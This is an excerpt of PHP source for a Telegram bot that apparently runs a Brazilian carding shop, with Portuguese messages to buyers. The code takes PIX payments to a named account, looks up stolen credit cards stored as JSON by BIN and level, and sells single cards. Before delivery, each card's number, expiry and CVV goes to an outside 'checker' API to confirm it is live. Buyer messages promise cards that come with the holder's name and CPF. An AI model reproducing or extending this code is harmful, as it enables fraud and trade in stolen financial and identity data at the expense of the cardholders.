...
function usagift($message, $cod){
	...
	if ($salva){
		...
		bot("sendMessage" , array("chat_id" => $chat_id , "text" => "*💰Opa, o saldo foi adicionado a sua conta 💎\nVocê pode ver está compra no seu perfil!*" , "reply_to_message_id" => $message['message_id'],"parse_mode" => "Markdown"));
			bot("sendMessage" , array("chat_id" => "@foginhostore" , "text" => "*💰Opa, o saldo foi adicionado a sua conta 💎\nVocê pode ver está compra no seu perfil!*" , "reply_to_message_id" => $message['message_id'],"parse_mode" => "Markdown"));	
	}else{
...
⛔ *OBS: Não fazemos trocas das CC's pois o material é testado automáticamente no nosso Checker de Full do Bot no ato da entrega das CC's para o usuário!*\n\n";
	...
	bot("editMessageText",array( "message_id" => $message['message_id'] , "chat_id"=> $chat_id , "text" => "✅🔥 FOGINHOSTORE PIX 🔥✅\n\n⚠️ PIX EMAIL ⚠️\n\n📩 EMAIL: foginhoccs@gmail.com\n📝 NOME: CARLOS RODRIGO
🏛 BANCO: MERCADO PAGO\n\n✅COMPROVATE: [🔥FOGINHO🔥](t.me/foginhoccs)","reply_to_message_id"=> $message['message_id'],  "parse_mode" => 'Markdown',"reply_markup" =>$menu));
}
...
function buscabin($message){
	...
	foreach ($levels as $key => $value) {
		$ccs = json_decode(file_get_contents("./ccs/brasil/{$value}.json") , true);
	...
	if (empty($result)){
		...
		die(bot("editMessageText",array( "message_id" => $message_id , "chat_id"=> $chat_id , "text" => "*Nem uma bin encontrada*","reply_markup" =>$menu,"reply_to_message_id"=> $message['message_id'],"parse_mode" => 'Markdown')));
...
function compraccs($message , $query , $level , $idcc , $band){
	...
	$saldo = $clientes[$chat_id]['saldo'];
	$ccs = json_decode(file_get_contents("./ccs/brasil/{$level}.json") , true);
	...
	foreach ($ccs as $key => $dadoscc) {
		...
		#================================#
				$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://botdodom.000webhostapp.com/api.php?lista=%20'.$dadoscc['cc'].'|'.$dadoscc['mds'].'|'.$dadoscc['ano'].'|'.$dadoscc['cvv'].'');
		...
		if(strpos($rchecker, 'Reprovada') !== false){
		...
		$txt .= "*Nivel:* _$dadoscc[nivel]_\n";
		$txt .= "*Tipo:* _$dadoscc[tipo]_\n\n";
		$txt .= "Saldo restante: $saldo\n";
		$txt .= "Status: (00 - success)\n";

		$menu =  ['inline_keyboard' => [

			[["text" => "Suporte" , "url" => "https://t.me/DomTroll"]]
		...
		bot("editMessageText",array( "message_id" => $message['message_id'] , "chat_id"=> $chat_id , "text" => $txt,"reply_markup" =>$menu,"reply_to_message_id"=> $message['message_id'],"parse_mode" => 'Markdown'));
		sleep(2);
		bot("sendmessage",array("chat_id" => $chat_id , "text" => "A Elite Agradece sua comprar" ));	
		die;
		}
...
function compracc($message,$query,$level){
	...
	$txt = "\n✅*Olá $nome, por gentileza escolha a bandeira desejada!!!*\n\nO Nível que vc escolheu foi:* {$level} *";
...
function ccun($message){
	...
	bot("editMessageText",array( "message_id" => $message['message_id'] , "chat_id"=> $chat_id , "text" => "💳 *Comprar CC Unitária*\n- Selecione o nivel da CC desejada.\n\n⚠️ *Leia com atenção* 👇\n\n✅ Ccs testadas no alto da comprar✅\n✅ Todas info já vem com nome e cpf✅\n✅ Garantimos live!!✅\n❌ Não garanto sua método de aprovação❌","reply_markup" =>$menu,"reply_to_message_id"=> $message['message_id'],"parse_mode" => 'Markdown'));
